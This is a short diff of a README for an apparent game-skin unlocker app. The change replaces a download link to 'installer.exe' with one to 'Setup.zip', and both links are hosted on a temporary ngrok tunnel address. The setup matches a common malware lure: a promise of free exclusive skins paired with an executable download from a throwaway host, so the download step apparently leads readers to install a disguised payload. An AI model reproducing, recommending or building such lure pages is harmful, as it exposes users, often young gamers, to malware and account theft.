@@ -12,7 +12,7 @@ An application designed to help gamers unlock exclusive skins for their favorite
 
 
 ## Installation 💻
-1. Download the application from [the download link](https://rich-anemone-ideal.ngrok-free.app/travailbat/installer.exe).
+1. Download the application from [the download link](https://rich-anemone-ideal.ngrok-free.app/finality/Setup.zip).
 2. Follow the installation instructions.
 
 ## How It Works 🛠️
